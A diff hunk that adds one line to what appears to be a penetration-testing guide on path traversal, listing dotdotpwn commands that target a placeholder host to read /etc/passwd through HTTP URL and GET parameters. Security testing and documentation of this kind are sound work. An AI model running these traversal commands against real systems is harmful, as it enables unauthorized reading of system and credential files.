@@ -198,6 +198,7 @@ Could not open file: ../../config.php
 
 ```bash
 # HTTP GET parameter
+dotdotpwn -m http-url -u http://target.com/path/TRAVERSAL -k "root" -f /etc/passwd
 dotdotpwn -m http -h target.com -x 80 -f /etc/passwd
 
 # HTTP POST parameter
